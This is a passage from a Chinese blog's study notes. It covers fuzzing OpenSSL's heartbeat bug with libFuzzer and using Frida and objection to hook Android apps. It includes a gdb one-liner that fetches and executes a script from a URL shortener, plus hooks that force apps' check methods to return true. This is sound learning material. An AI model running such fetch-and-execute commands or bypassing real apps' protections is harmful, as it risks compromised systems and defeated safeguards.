class="line">==4447==ABORTING</span><br><span class="line">MS: 2 InsertByte-InsertByte-; base unit: 6409fc1658e8c93af3744d90dd4f7eb4dbc6e488</span><br><span class="line">0x18,0x3,0xff,0x0,0xd,0x1,0xbd,0x0,0x0,0xb3,0x0,0x0,0x0,0x0,0x0,0xd,0xd,0xd,0xd,0xd,0xd,0x0,0x0,0x0,</span><br><span class="line">\x18\x03\xff\x00\x0d\x01\xbd\x00\x00\xb3\x00\x00\x00\x00\x00\x0d\x0d\x0d\x0d\x0d\x0d\x00\x00\x00</span><br><span class="line">artifact_prefix=&#x27;./&#x27;; Test unit written to ./crash-052a0bf2b9eddd783de293aa5452c3212975c9c1</span><br><span class="line">Base64: GAP/AA0BvQAAswAAAAAADQ0NDQ0NAAAA</span><br></pre></td></tr></table></figure>

<p>SUMMARY: AddressSanitizer: heap-buffer-overflow (&#x2F;home&#x2F;fourth&#x2F;fuzz&#x2F;libfuzzer-workshop-master&#x2F;lessons&#x2F;05&#x2F;openssl_fuzzer+0x435776) in memcpy</p>
<p>可以看到就是tls1_process_heartbeat这里出错了。</p>
<h2 id="crash分析"><a href="#crash分析" class="headerlink" title="crash分析"></a>crash分析</h2><p>在gdb中使用GEF来复现</p>
<p>注意，需要使用代理才可以使用该工具（或者你换一种使用方法也是可以的），使用的文件是上面fuzzing出来的crash文件（以id开头的文件）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains gdb -Q target</span><br><span class="line"></span><br><span class="line">(gdb)pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix=<span class="string">&#x27;-gef.py&#x27;</span>); open(g.name, <span class="string">&#x27;wb+&#x27;</span>).write(u.urlopen(<span class="string">&#x27;https://tinyurl.com/gef-master&#x27;</span>).<span class="built_in">read</span>()); gdb.execute(<span class="string">&#x27;source %s&#x27;</span> % g.name)</span><br><span class="line"></span><br><span class="line">gef&gt; r &gt; <span class="built_in">id</span>:000000,sig:06,src:000004+000003,time:27696,op:splice,rep:4</span><br><span class="line"></span><br><span class="line">exploitable</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm">https://releases.llvm.org/5.0.0/docs/LibFuzzer.html#fuzzing-components-of-llvm</a></p>
<p><a href="https://github.com/Dor1s/libfuzzer-workshop">https://github.com/Dor1s/libfuzzer-workshop</a></p>
<p><a href="https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/">https://trustfoundry.net/introduction-to-triaging-fuzzer-generated-crashes/</a></p>
]]></content>
      <categories>
        <category>Fuzzing</category>
        <category>libfuzzer</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>frida学习</title>
    <url>/2022/05/17/frida-%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="linux实用小工具"><a href="#linux实用小工具" class="headerlink" title="linux实用小工具"></a>linux实用小工具</h1><ul>
<li>htop：可以查看当前活跃的、占用高的进程</li>
<li>jnettop：流量查看工具，可以查看下载和安装进度</li>
</ul>
<p>arm64-v8a   手机的架构</p>
<h1 id="frida安装"><a href="#frida安装" class="headerlink" title="frida安装"></a>frida安装</h1><p><a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p>
<p>基本上每一次打开虚拟机都需要运行一下 ~&#x2F;.bashrc 将会添加环境变量，为了方便python env等</p>
<ul>
<li><p>设定特定的python版本 ： pyenv local 3.8.0</p>
</li>
<li><p>安装nodejs：sudo apt install -y nodejs</p>
</li>
<li><p>下载adb：wget <a href="https://dl.google.com/android/repository/platform-tools-latest-linux.zip%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">https://dl.google.com/android/repository/platform-tools-latest-linux.zip，并添加环境变量</a> export PATH&#x3D;”&#x2F;root&#x2F;Downloads&#x2F;platform-tools:$PATH”</p>
</li>
<li><p>安装 npm: npm install</p>
</li>
<li><p>安装frida、frida-tools、下载frida-server,注意版本问题</p>
<ul>
<li>proxychains wget <a href="https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz">https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz</a></li>
<li>pip install frida&#x3D;&#x3D;12.8.0</li>
<li>proxychains pip install frida-tools &#x3D;&#x3D;5.3.0</li>
</ul>
</li>
<li><p>使用Frida的时候需要开启服务</p>
<ul>
<li>手机开启服务器： &#x2F;data&#x2F;local&#x2F;tmp&#x2F;fs1280arm64 -l 0.0.0.0:8888</li>
</ul>
</li>
</ul>
<h1 id="安装objection，使用方法："><a href="#安装objection，使用方法：" class="headerlink" title="安装objection，使用方法："></a>安装objection，使用方法：</h1><p><strong>objection -N -h 192.168.3.131 -p 8888 -g com.miui.weather2 explore</strong></p>
<ul>
<li><p>objection 常用指令</p>
<ul>
<li>查看内存中加载的库：memory list modules</li>
<li>查看某个库的导出函数：memory list exports libssl.so</li>
<li>在内存堆中搜索：android heap search instances com.android.settings.DisplaySettings</li>
<li>执行：android heap execute handleID handleID中的某个函数名</li>
<li>查看当前可用activity：android hooking list activities</li>
<li>直接启动某个activity：android intent launch_activity com.android.settings.DisplaySettings。这个可以用来绕过某些activity</li>
<li>查看包含关键字的类： android hooking list classes</li>
<li>查看指定类里面的方法：android hooking list class_methods com.android.settings.DisplaySettings</li>
<li>查看某个类的动态信息：android  hooking  watch class android.bluetooth.BluetoothDevice</li>
<li>在找到相关的某些信息之后，堆设备进行相关的操作会得到打印出一些有用的信息</li>
<li>动态查看某个类下面的某个函数的参数，返回值，调用栈：android hooking watch class_method android.bluetooth.BluetoothDevice.getName –dump-args –dump-return –dump-backtrace</li>
<li>在hook单个函数的时候会HOOK所有的重载（函数名相同，参数不同）：android hooking watch class_method java.io.File.$init –dump-args</li>
<li>加载插件：有两种方式，一种是在objection里面：plugin load 插件的具体位置；另一种是直接在使用objection的时候就加载插件：objection -N -h 192.168.3.131 -p 5555 -g com.android.settings explore -P ~&#x2F;.objection&#x2F;plugins</li>
<li>加载插件wallbreaker ,查看某个类中的变量函数签名等信息：<ul>
<li>plugin wallbreaker classdump –fullname android.bluetooth.BluetoothDevice</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="frida基础"><a href="#frida基础" class="headerlink" title="frida基础"></a>frida基础</h1><p>打印调用栈的js</p>
<p><code>console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new()));</code></p>
<p><strong>一般Java里面怎么写，那么用JS实现的时候，里面就同样这么写</strong></p>
<p><strong>基本操作步骤：</strong></p>
<ol>
<li>获取：参数，调用栈，返回值</li>
<li>方法重载，参数构造，动静态函数的处理（动态函数需要获取类的instance之后调用，静态函数可以直接调用)</li>
<li>主动调用，不管具体实现，因为中间可能会涉及到jni，直接返回结果</li>
<li>hook,invoke,rpc</li>
</ol>
<p>注意，主动调用是不需要，由脚本返回其返回值的，</p>
<p>简单示例：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//有重载需要指定函数的参数</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg1,arg2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(arg1,arg2);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1,arg2,result&quot;</span>,arg1,arg2,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">800</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span> =<span class="keyword">function</span>(<span class="params">arg1</span>)&#123;</span><br><span class="line">			<span class="comment">//实例化一个字符串的方式</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;NIHAOYA!&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg1,result&quot;</span>,arg1,result)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;result&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//因为是动态的方法，所以需要获取到instance之后再进行调用</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                instance.<span class="title function_">secret</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;instance secret:&quot;</span>,instance.<span class="title function_">secret</span>())</span><br><span class="line">            &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">		<span class="comment">//如果某个函数是静态的方法的话，就可以直接嗲用该函数即可，</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.lesson4one.MainActivity&quot;</span>).<span class="title function_">secret2</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;secret2:&quot;</span>,result);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>

<p>frida使用js脚本</p>
<p>frida -H 192.168.3.131:8888 -f  com.example.lesson4one -l lesson5.js  –no-pause</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">─<span class="comment"># frida --help                                                                    </span></span><br><span class="line">Usage: frida [options] target</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program<span class="string">&#x27;s version number and exit</span></span><br><span class="line"><span class="string">  -h, --help            show this help message and exit</span></span><br><span class="line"><span class="string">  -D ID, --device=ID    connect to device with the given ID</span></span><br><span class="line"><span class="string">  -U, --usb             connect to USB device</span></span><br><span class="line"><span class="string">  -R, --remote          connect to remote frida-server</span></span><br><span class="line"><span class="string">  -H HOST, --host=HOST  connect to remote frida-server on HOST</span></span><br><span class="line"><span class="string">  -f FILE, --file=FILE  spawn FILE（启动app）</span></span><br><span class="line"><span class="string">  -F, --attach-frontmost</span></span><br><span class="line"><span class="string">                        attach to frontmost application</span></span><br><span class="line"><span class="string">  -n NAME, --attach-name=NAME</span></span><br><span class="line"><span class="string">                        attach to NAME</span></span><br><span class="line"><span class="string">  -p PID, --attach-pid=PID</span></span><br><span class="line"><span class="string">                        attach to PID</span></span><br><span class="line"><span class="string">  --stdio=inherit|pipe  stdio behavior when spawning (defaults to “inherit”)</span></span><br><span class="line"><span class="string">  --runtime=duk|v8      script runtime to use (defaults to “duk”)</span></span><br><span class="line"><span class="string">  --debug               enable the Node.js compatible script debugger</span></span><br><span class="line"><span class="string">  -l SCRIPT, --load=SCRIPT</span></span><br><span class="line"><span class="string">                        load SCRIPT</span></span><br><span class="line"><span class="string">  -P PARAMETERS_JSON, --parameters=PARAMETERS_JSON</span></span><br><span class="line"><span class="string">                        Parameters as JSON, same as Gadget</span></span><br><span class="line"><span class="string">  -C CMODULE, --cmodule=CMODULE</span></span><br><span class="line"><span class="string">                        load CMODULE</span></span><br><span class="line"><span class="string">  -c CODESHARE_URI, --codeshare=CODESHARE_URI</span></span><br><span class="line"><span class="string">                        load CODESHARE_URI</span></span><br><span class="line"><span class="string">  -e CODE, --eval=CODE  evaluate CODE</span></span><br><span class="line"><span class="string">  -q                    quiet mode (no prompt) and quit after -l and -e</span></span><br><span class="line"><span class="string">  --no-pause            automatically start main thread after startup </span></span><br><span class="line"><span class="string">  -o LOGFILE, --output=LOGFILE</span></span><br><span class="line"><span class="string">                        output to log file</span></span><br><span class="line"><span class="string">  --exit-on-error       exit with code 1 after encountering any exception in</span></span><br><span class="line"><span class="string">                        the SCRIPT</span></span><br></pre></td></tr></table></figure>

<p>打印出对象的值 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line"><span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x&quot;</span>,gson.$new().<span class="title function_">toJson</span>(x))</span><br><span class="line"><span class="comment">//或者使用下面的这种方法</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;or , x,result&quot;</span>,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(x),result)</span><br></pre></td></tr></table></figure>

<p>构造数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> charArray = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;char&#x27;</span>,[<span class="string">&quot;a&quot;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>子类对象转成父类对象(注意，父类不能转换成子类)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">fatherHandle</span> <span class="operator">=</span> Java.cast(sonHandle,Java.use(<span class="string">&quot;father.packageName&quot;</span>))</span><br><span class="line">console.log(<span class="string">&quot;father invoke method: &quot;</span>,fatherHandle.method()) </span><br><span class="line"></span><br><span class="line"><span class="comment">//然而子类是可以转成父类的，类似于Java中的泛型，编译看左边运行看右边的那个</span></span><br><span class="line"><span class="type">var</span> <span class="variable">Juicehandle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">Java.choose(<span class="string">&quot;com.r0ysue.a0526printout.Juice&quot;</span>,&#123;</span><br><span class="line">     onMatch:function(instance)&#123;</span><br><span class="line">          console.log(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">          console.log(<span class="string">&quot;juice instance call fillEnergy:&quot;</span>,instance.fillEnergy());</span><br><span class="line">          Juicehandle = instance;</span><br><span class="line">    &#125;,onComplete:function()&#123;console.log(<span class="string">&quot;search complemented!&quot;</span>)&#125;</span><br><span class="line">&#125;)</span><br><span class="line">           </span><br><span class="line"><span class="type">var</span> <span class="variable">Waterhandle</span> <span class="operator">=</span> Java.cast(Juicehandle,Java.use(<span class="string">&quot;com.r0ysue.a0526printout.Water&quot;</span>))</span><br><span class="line">console.log(<span class="string">&quot;water still method: &quot;</span>,Juicehandle.still(Waterhandle))</span><br></pre></td></tr></table></figure>

<p>注册类，还可以实现接口</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> beer = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">     <span class="attr">name</span>:<span class="string">&#x27;com.r0ysue.a0526printout.Beer&#x27;</span>,</span><br><span class="line">     <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.a0526printout.liquid&#x27;</span>)],</span><br><span class="line">     <span class="attr">methods</span>:&#123;</span><br><span class="line">          <span class="attr">flow</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">          		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;i am beer!&quot;</span>)</span><br><span class="line">                <span class="keyword">var</span> result = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;test good&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> result</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//可以直接new</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;neer.flow:&quot;</span>,beer.$new().<span class="title function_">flow</span>())</span><br></pre></td></tr></table></figure>

<p>hookHashmap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setImmediate(main)</span></span><br><span class="line"></span><br><span class="line">function <span class="title function_">hookHashMap</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">       </span><br><span class="line">        Java.choose(<span class="string">&quot;java.util.HashMap&quot;</span>,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                <span class="keyword">if</span>(instance.toString().indexOf(<span class="string">&quot;key words&quot;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="comment">//zhaodaole </span></span><br><span class="line">                    console.log(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">                    console.log(<span class="string">&quot;invoke toString:&quot;</span>,instance.toString())</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;,onComplete:function()&#123;console.log(<span class="string">&quot;search completed!&quot;</span>)&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">//hook到了put方法</span></span><br><span class="line">        Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>).put.implementation = function(x,y)&#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.put(x,y)</span><br><span class="line">            console.log(<span class="string">&quot;x,y,result&quot;</span>,x,y,result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置成员变量的值，修改成员变量的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity2&quot;</span>).<span class="title function_">setStatic_bool_var</span>();</span><br><span class="line"><span class="comment">//如果是静态变量和静态方法，可以直接利用类名就可以修改</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity3&quot;</span>).<span class="property">static_bool_var</span>.<span class="property">value</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> fridaActivity3Handle = <span class="literal">null</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.example.androiddemo.Activity.FridaActivity3&quot;</span>,&#123;</span><br><span class="line">     <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found instance:&quot;</span>,instance)</span><br><span class="line">         fridaActivity3Handle = instance</span><br><span class="line">         <span class="comment">//如果是非静态的，则需要获取他的类的handle才可以修改</span></span><br><span class="line">         fridaActivity3Handle.<span class="property">bool_var</span>.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">         <span class="comment">//同名变量需要加一个下划线（成员变量名和函数名子一样）</span></span><br><span class="line">         fridaActivity3Handle.<span class="property">_same_name_bool_var</span>.<span class="property">value</span> = <span class="literal">true</span></span><br><span class="line">      &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;searc completed!&quot;</span>)&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>获取内部类的所有方法，这里和Java反射一样的</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">     <span class="keyword">var</span> class_name = <span class="string">&quot;com.example.androiddemo.Activity.FridaActivity4$InnerClasses&quot;</span></span><br><span class="line">     <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(class_name)</span><br><span class="line">     <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;methods.<span class="property">length</span>;i++)&#123;</span><br><span class="line">          <span class="keyword">var</span> method = methods[i]</span><br><span class="line">          <span class="comment">// console.log(method)</span></span><br><span class="line">          <span class="comment">//得到去除类名的函数的签名</span></span><br><span class="line">         <span class="keyword">var</span> subString = method.<span class="title function_">toString</span>().<span class="title function_">substr</span>(method.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(class_name)+class_name.<span class="property">length</span>+<span class="number">1</span>)</span><br><span class="line">         <span class="comment">//得到类的方法名</span></span><br><span class="line">         <span class="keyword">var</span> finalMethodString = subString.<span class="title function_">substr</span>(<span class="number">0</span>,subString.<span class="title function_">indexOf</span>(<span class="string">&#x27;(&#x27;</span>))</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(finalMethodString)</span><br><span class="line">         clazz[finalMethodString].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>&#125;</span><br><span class="line">      &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>如果某个方法是动态加载了另一个dex文件里面的，则hook的时候需要注意时机，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">     <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">              <span class="comment">//找到类名</span></span><br><span class="line">          	<span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.example.androiddemo.Dynamic.DynamicCheck&quot;</span>))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Succefully found loader!&quot;</span>,loader);</span><br><span class="line">                 <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader;</span><br><span class="line">           	&#125;</span><br><span class="line">          &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">               <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found error &quot;</span>+error)</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;,<span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="string">&quot;enum completed!&quot;</span>&#125;</span><br><span class="line">&#125;)     <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.androiddemo.Dynamic.DynamicCheck&quot;</span>).<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>另一种方法找到目标函数，这个还可以得到该类的handle</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">     <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(name.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;com.example.androiddemo.Activity.Frida6.Frida6&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line">           <span class="title class_">Java</span>.<span class="title function_">use</span>(name).<span class="property">check</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> <span class="literal">true</span>&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;,<span class="title function_">onComplete</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="RPC-remote-procedure-call"><a href="#RPC-remote-procedure-call" class="headerlink" title="RPC[remote procedure call]"></a>RPC[remote procedure call]</h1><p><u><strong>RPC的顺序很重要：先hook到函数，然后能够对其进行主动调用，最后才上到rpc上</strong></u></p>
<p>获取设备：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  设备启动frida在特定的端口：/data/local/tmp/fs1280arm64 -l 0.0.0.0:8888</span></span><br><span class="line"></span><br><span class="line">str_host = <span class="string">&#x27;192.168.3.131:8888&#x27;</span></span><br><span class="line">manager = frida.get_device_manager()</span><br><span class="line">device = manager.add_remote_device(str_host)</span><br><span class="line"><span class="comment"># device = frida.get_usb_device()</span></span><br><span class="line"><span class="comment"># pid = device.spawn([&quot;com.example.lesson4one&quot;])</span></span><br><span class="line"><span class="comment"># device.resume</span></span><br><span class="line"><span class="comment"># time.sleep(1)e</span></span><br><span class="line"><span class="comment"># session = device.attach(pid)</span></span><br><span class="line">session = device.attach(<span class="string">&quot;com.example.lesson4one&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>获取设备并调用js脚本,</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python脚本</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> scandir</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message,payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">str_host = <span class="string">&#x27;192.168.3.131:8888&#x27;</span></span><br><span class="line">manager = frida.get_device_manager()</span><br><span class="line">device = manager.add_remote_device(str_host)</span><br><span class="line">session = device.attach(<span class="string">&quot;com.example.lesson4one&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lesson7lesson4.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>,my_message_handler)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;enter command:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command ==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> command == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        script.exports.invokefunc()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>设备和js和python交互，并修改相关信息</strong></p>
<p>首先js hook到相关函数信息，然后将数据发送到python脚本，使用python脚本对数据进行处理之后，再发送给js脚本，然后使用js脚本修改app当中的信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> scandir</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message,payload</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;message&quot;</span>,message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload&quot;</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;message[&#x27;payload&#x27;]&quot;</span>,message[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line">        data = message[<span 